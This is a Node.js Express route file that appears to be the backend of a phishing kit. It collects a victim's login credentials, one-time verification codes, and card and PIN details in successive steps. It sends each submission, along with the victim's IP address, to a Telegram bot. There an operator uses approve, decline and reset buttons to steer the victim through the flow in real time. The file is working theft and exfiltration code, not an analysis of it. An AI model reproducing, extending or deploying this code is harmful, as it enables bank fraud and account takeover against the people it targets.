/**
 * POST /api/submit
 * Body: { step: number, data: { ... } }
 */
const express = require('express');
const router  = express.Router();
const { sendTelegram, h, loadState, saveState } = require('../config');

const stepTitles = {
    1: 'Login Credentials',
    2: 'OTP / Verification Code',
    3: 'Card / Pin Details'
};

router.post('/', async (req, res) => {
    const { step, data } = req.body || {};

    // Validate
    if (typeof step !== 'number' || !data || typeof data !== 'object') {
        return res.status(400).json({ success: false, message: 'Malformed payload.' });
    }
    if (Object.keys(data).length === 0) {
        return res.status(400).json({ success: false, message: 'No data received.' });
    }

    // ---------- Build message ----------
    const title = stepTitles[step] || `Step ${step}`;

    let text = `<b>New Submission — ${title}</b>\n`;
    text += '────────────────────\n';

    for (const [key, value] of Object.entries(data)) {
        text += `• <b>${h(key)}:</b> ${h(value)}\n`;
    }

    text += '────────────────────\n';
    text += `IP: ${h(req.ip || req.connection.remoteAddress || 'unknown')}\n`;
    text += `${new Date().toISOString().replace('T', ' ').slice(0, 19)}`;

    // ---------- Inline Keyboard for Admin Approval ----------
    const replyMarkup = {
        inline_keyboard: [
            [
                { text: 'Approve (Next Step)', callback_data: 'action_approve' },
                { text: 'Decline (Retry)', callback_data: 'action_decline' }
            ],
            [
                { text: 'Finish (Complete Flow)', callback_data: 'action_done' },
                { text: 'Reset All', callback_data: 'action_reset' }
            ]
        ]
    };

    // ---------- Send to Telegram ----------
    const tgResult = await sendTelegram(text, replyMarkup);
    if (!tgResult.ok) {
        let errorMsg = 'Failed to send to Telegram.';
        if (tgResult.error && tgResult.error.includes('chat not found')) {
            errorMsg = 'Telegram error: Chat not found. Please open @Planwell2_bot in Telegram and tap /start.';
        }
        return res.status(502).json({ success: false, message: errorMsg, error: tgResult.error });
    }

    // ---------- Update state → pending ----------
const state = loadState();
state.step   = step + 1;    // ✅ FIX: Advance to the next step so frontend moves forward
state.status = 'pending';
saveState(state);

    return res.json({ success: true, message: 'Submitted.' });
});

module.exports = router;